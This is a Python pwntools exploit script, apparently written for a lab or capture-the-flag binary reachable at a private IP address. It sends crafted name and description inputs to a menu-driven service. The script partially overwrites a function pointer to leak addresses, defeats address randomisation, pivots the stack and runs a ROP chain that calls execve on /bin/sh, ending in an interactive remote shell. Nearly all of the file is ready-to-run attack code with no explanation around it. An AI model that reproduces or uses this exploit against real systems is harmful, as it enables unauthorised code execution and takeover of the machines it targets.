#!/usr/bin/python

#h0rac

from pwn import *
import sys

conn = remote("192.168.56.104",666)

username = "A" * 31
desc = "B"*90+"\xe2\x5b" #partial overwrite of print_name func

tick = 0.1

data =''
ndata = ''

def calc_base(addr,offset):
	return addr - offset

try:
	conn.sendline("1")
	sleep(tick)
	print conn.recvuntil("Enter your name:")
	log.info("username %s",username)
	conn.sendline(username)
	sleep(tick)
	print conn.recvuntil("Enter your description:")
	log.info("description %s",desc)
	conn.send(desc)
	sleep(tick)
	print conn.recv()
	#conn.interactive()
	conn.sendline("3")
	print conn.recv()
	data += conn.recv()

	if data:
		print "FILTERED DATA",data[170:178]
		leak1 = data[170:174]
		leak2 = data[174:178]

		log.info("leak 1 %s",hex(u32(leak1)))
		log.info("leak 2 %s",hex(u32(leak2)))

		leak1 = u32(leak1)

		base_addr = calc_base(leak1,0xbe2)
		gadget1 = 0x0000063e # ret;
		gadget2 = 0x00000655 # pop ebx ; ret
		gadget3 = 0x00000976 # int 0x80;

		pivot1 = 0x000009da # add esp, 0x44 ; pop ebx ; pop ebp ; ret
		
		gadget4 = 0x00000963 # add esp, 0x24 ; pop ebx ; pop ebp ; ret
		gadget5 = 0x00000655 # pop ebx ; ret

		ulisting_struct = 0x00003140

		#Calculate offset by substracting BASE_ADDR FROM LEAK ADDRESS
		offset = leak1 - base_addr
		#Calculaye GADGET address by substracing LEAK-OFSET and add GADGET ADDR 
		real_gadget1 =(leak1 - offset )+ gadget1
		real_gadget2 =(leak1 - offset )+ gadget2
		real_gadget3 =(leak1 - offset )+ gadget3
		real_gadget4 =(leak1 - offset )+ gadget4
		real_gadget5 =(leak1 - offset )+ gadget5

		real_pivot1 = (leak1 - offset)+pivot1
		ulisting_struct_addr = (leak1 - offset )+ ulisting_struct

		log.info("Base address %s code section", hex(base_addr))
		log.info("Gadget 1 addr: %s",hex(real_gadget1))
		log.info("Gadget 2 addr: %s",hex(real_gadget2))
		log.info("Gadget 3 addr: %s",hex(real_gadget3))
		log.info("Pivot addr %s",hex(real_pivot1))
		log.info("Ulisting struct addr: %s",hex(ulisting_struct_addr))

		#-------------------------------LIBC LEAK ------------------------------#

		p = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPRRRRSSSSTTTT"+p32(real_gadget4)+"ZZZZ"+"QQQQ"
		conn.sendline("1")
		print conn.recvuntil("Enter your name:")
		conn.sendline(username)
		print conn.recvuntil("Enter your description:")
		desc = "CC"+p32(real_pivot1)+p
		conn.send(desc)

		print conn.recv()
		conn.sendline("3")
		print conn.recv()
		ndata += conn.recv()

		print "NDATA",len(ndata)
		print "FILTERED NDATA", ndata

		libc_leak = 0

		if len(ndata) == 283:

			conn.close()

		if len(ndata) == 297:
			print "TEST NDATA ELSE",ndata[len(ndata)-19::]

			leaked_addrs = ndata[len(ndata)-19::]

			libc_leak = u32(leaked_addrs[0:4])

		log.info("Libc leaked addr %s",hex(libc_leak))

		libc_base = calc_base(libc_leak,0x19999)

		offset = libc_leak - libc_base

		log.info("Libc base addr %s",hex(libc_base))

		libc_gadget1 = 0x00081d95 # xor edx, edx ; mov eax, edx ; ret
		libc_gadget2 = 0x00040bfb # inc eax ; inc eax ; ret
		libc_gadget3 = 0x00126526 # dec eax ; ret

		libc_gadget_addr1 = (libc_leak - offset) +  libc_gadget1
		libc_gadget_addr2 = (libc_leak - offset) +  libc_gadget2
		libc_gadget_addr3 = (libc_leak - offset) +  libc_gadget3

		log.info("Libc gadget 1 addr %s",hex(libc_gadget_addr1))
		log.info("Libc gadget 1 addr %s",hex(libc_gadget_addr2))
		log.info("Libc gadget 1 addr %s",hex(libc_gadget_addr3))

		#-------------------------------END LIBC LEAK ------------------------------#


		conn.sendline("1")
		print conn.recvuntil("Enter your name:")
		conn.sendline(username)
		print conn.recvuntil("Enter your description:")

		#-------------------------------EXECVE SYS CALL ROP ------------------------------#

		payload = "EE"+p32(real_gadget1)
		payload += p32(real_gadget1)
		payload += p32(real_gadget1)
		payload += p32(real_gadget1)
		payload += p32(real_gadget1)
		payload += p32(real_gadget1)
		payload += p32(real_gadget1)
		payload += p32(real_gadget2)
		payload += p32(ulisting_struct_addr)
		payload += p32(libc_gadget_addr1)
		payload += p32(libc_gadget_addr2)
		payload += p32(libc_gadget_addr2)
		payload += p32(libc_gadget_addr2)
		payload += p32(libc_gadget_addr2)
		payload += p32(libc_gadget_addr2)
		payload += p32(libc_gadget_addr2)
		payload += p32(libc_gadget_addr3)
		payload += p32(real_gadget3)

		conn.send(payload)

		conn.send("2")
		#conn.recvuntil("Enter your item's name:")
		conn.send("//bin/sh\x00")
		#conn.recvuntil("Enter your item's price:")
		conn.sendline("AA")

		print conn.recv()

			#-------------------------------END EXECVE SYS CALL ROP ------------------------------#

		conn.send("4")
		#this will triger exit to start system call

		conn.interactive()

		#----------------------Put 4 and ENTER and enjoy shell------------------------------#

except EOFError:
	pass


